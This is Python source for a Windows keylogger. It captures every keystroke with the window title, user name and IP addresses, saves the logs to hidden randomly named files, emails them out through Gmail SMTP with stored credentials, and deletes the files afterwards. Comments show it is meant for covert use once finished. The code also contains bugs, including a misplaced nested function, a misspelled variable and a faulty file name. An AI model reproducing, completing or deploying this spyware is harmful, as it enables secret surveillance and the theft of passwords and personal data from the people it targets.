"""
Working on python 3.6.5
Need to be installed: pynput, requests, win32gui, pywin32
"""
from pynput.keyboard import Key, Listener
import time
import os
import random
import requests
import socket
import win32gui
import smtplib
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
from email.mime.base import MIMEBase
from email import encoders
import config
import threading

publicIP = requests.get('https://api.ipify.org').text
privateIP = socket.gethostbyname(socket.gethostname())
user = os.path.expanduser('~').split('\\')[2] # home directory splitting by '/' because i use unix system - for windows its "\\"
datetime = time.ctime(time.time())

msg = f'[START OF LOGS]\n  *~ Date/Time: {datetime}\n  *~ User-Profile: {user}\n  *~ Public-IP: {publicIP}\n  *~ Private-IP: {privateIP}\n\n'

logged_data = []
logged_data.append(msg)

old_app = ''
delete_file = []


def on_press(key):
    global old_app

    """Finding the app what is currently used"""
    new_app = win32gui.GetWindowText(win32gui.GetForegroundWindow())

    if new_app == 'Cortana':
        new_app = 'Windows start menu'
    else:
        pass
    
    substitution = ['Key.enter', '[ENTER]\n', 'Key.backspace', '[BACKSPACE]', 'Key.space', ' ',
            'Key.alt_l', '[ALT]', 'Key.tab', '[TAB]', 'Key.delete', '[DEL]', 'Key.ctrl_l', '[CTRL]', 
	'Key.left', '[LEFT ARROW]', 'Key.right', '[RIGHT ARROW]', 'Key.shift', '[SHIFT]', '\\x13', 
	'[CTRL-S]', '\\x17', '[CTRL-W]', 'Key.caps_lock', '[CAPS LK]', '\\x01', '[CTRL-A]', 'Key.cmd', 
	'[WINDOWS KEY]', 'Key.print_screen', '[PRNT SCR]', '\\x03', '[CTRL-C]', '\\x16', '[CTRL-V]']
    
    key = str(key).strip('\'')

    if key in substitution:
        logged_data.append(substitution[substitution.index(key)+1])
    else:
        logged_data.append(key)

    """temporary print to print pressed keys"""    
    print(key)


def write_file(count):
    one = os.path.expanduser('~') + '/Documents/'
    two = os.path.expanduser('~') + '/Pictrues/'

    list = [one, two]

    filepath = random.choice(list)

    """counting logs"""
    filename = str(count) + 'I' + random.randint(1000000, 9999999) + '.txt'
    file = filepath + filename
    delete_file.append(file)

    with open(file, 'w') as fp:
        fp.write(''.join(logged_data))

    def send_logs():
        count = 0 

        fromAddr = config.fromAddr
        fromPswd = config.fromPswd
        toAddr = fromAddr

        MIN = 10
        SECONDS = 60

        time.sleep(10)
        
        while True:
            if len(logged_data) > 1:
                try:
                    write_file(count)

                    subject = f'[{user}] ~ {count}'

                    msg = MIMEMultipart()
                    msg['From'] = fromAddr
                    msg['To'] = toAddr
                    msg['Subject'] = subject
                    body = 'testing'
                    msg.attach(MIMEText(body, 'plain'))

                    attachment = open(delete_file[0], 'rb')

                    filename = delete_filep[0].split('/')[2]

                    part = MIMEBase('application','octect-stream')
                    part.set_payload((attachment).read())
                    encoders.encode_base64(part)
                    part.add_header('content-disposition','attachment;filename='+str(filename))
                    msg.attach(part)

                    text = msg.as_string()

                    """gmail ip to send message"""
                    s = smtplib.SMTP('smtp.gmail.com', 587)
                    s.ehlo()
                    s.starttls()
                    s.ehlo()
                    s.login(fromAddr, fromPswd)
                    s.sendmail(fromAddr, toAddr, text)
                    attachment.close()
                    s.close()

                    """delete file from system"""

                    os.remove(delete_file[0])
                    del logged_data[1:]
                    del delete_file[0:]

                    count += 1

                except:
                    pass

"""temporary function to stop listening when esc is pressed - remove it in final version"""
def on_release(key):
    if key == Key.esc:
        return False

"""Testing"""
if __name__ == '__main__':
    t1 = threading.Thread(target=send_logs)
    t1.start()

    """keyboard listener (dont forget to remove on_release xD"""
    with Listener(on_press=on_press, on_release=on_release) as listener:
        listener.join()
